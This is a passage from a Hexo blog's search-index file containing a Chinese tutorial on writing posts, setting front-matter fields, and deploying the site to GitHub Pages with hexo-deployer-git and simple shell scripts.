src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528173531232.png" alt="image-20230528173531232"></p><p>验证图片上传选项：</p><p><img src="https://gallery-1310215391.cos.ap-beijing.myqcloud.com/img/image-20230528173559303.png" alt="image-20230528173559303"></p><h2 id="文章书写"><a href="#文章书写" class="headerlink" title="文章书写"></a>文章书写</h2><ol><li>先在 typora 上写完，在复制到 <code>source\_posts</code> 目录即可 ( md 文件 )</li><li>使用 <code>hexo new 文章名</code> 在 <code>source\_posts</code> 下创建文章，在书写</li></ol><p>可以本地书写，然后使用 <code>hexo</code> 创建文章，文章最好是英文名称，然后在把本地的替换掉即可</p><p><code>Front-matter </code> 常用参数：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-attr">title:</span> <span class="hljs-string">SQL</span> <span class="hljs-string">注入</span><br><span class="hljs-attr">date:</span> <span class="hljs-number">2023-05-28 17:41:56</span><br><span class="hljs-attr">tags:</span> <span class="hljs-string">Web</span> <span class="hljs-string">漏洞</span><br><span class="hljs-attr">categories:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">渗透测试</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">Web</span> <span class="hljs-string">漏洞</span><br><span class="hljs-meta">---</span><br></code></pre></td></tr></table></figure><h2 id="部署上线"><a href="#部署上线" class="headerlink" title="部署上线"></a>部署上线</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">1. 安装 hexo-deployer-git</span><br>npm install hexo-deployer-git --save<br><span class="hljs-meta prompt_"># </span><span class="language-bash">2. 修改站点配置文件 ( `_config.yml` )</span><br>deploy:<br>  type: git<br>  repo: git@github.com:fuyoumingyan/fuyoumingyan.github.io.git <br>  branch: main<br><span class="hljs-meta prompt_"># </span><span class="language-bash">3. 推送到线上 ( 先执行一下 clean 和 g )</span><br>hexo d<br></code></pre></td></tr></table></figure><p>推送上去后，可能不会立即生效，过一会刷新一下网页就好了。</p><h2 id="优化使用"><a href="#优化使用" class="headerlink" title="优化使用"></a>优化使用</h2><p>部署这里可以使用 shell 脚本来完成，安装了 git 后，在 windows 环境下也是可以运行 shell 脚本的。</p><p>在本地部署站点 <code>server.sh</code> ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">hexo clean<br>hexo g<br>hexo s<br></code></pre></td></tr></table></figure><p>推送到线上 <code>publish.sh</code> ：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo clean</span><br><span class="hljs-attribute">hexo g</span><br><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>其他</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
